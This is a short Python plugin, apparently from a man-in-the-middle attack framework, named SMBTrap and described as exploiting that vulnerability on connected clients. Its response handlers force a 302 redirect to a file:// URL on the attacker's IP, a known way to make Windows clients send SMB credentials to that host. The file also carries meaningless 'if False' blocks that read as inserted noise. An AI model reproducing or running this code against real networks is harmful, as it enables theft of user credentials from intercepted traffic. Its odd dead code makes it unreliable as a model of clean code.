import random
import string
from plugins.plugin import Plugin

class SMBTrap(Plugin):
    name = 'SMBTrap'
    optname = 'smbtrap'
    desc = 'Exploits the SMBTrap vulnerability on connected clients'
    version = '1.0'

    def initialize(self, options):
        if False:
            for i in range(10):
                print('nop')
        self.ip = options.ip

    def responsestatus(self, request, version, code, message):
        if False:
            while True:
                i = 10
        return {'request': request, 'version': version, 'code': 302, 'message': 'Found'}

    def responseheaders(self, response, request):
        if False:
            i = 10
            return i + 15
        self.clientlog.info('Trapping request to {}'.format(request.headers['host']), extra=request.clientInfo)
        rand_path = ''.join(random.sample(string.ascii_uppercase + string.digits, 8))
        response.responseHeaders.setRawHeaders('Location', ['file://{}/{}'.format(self.ip, rand_path)])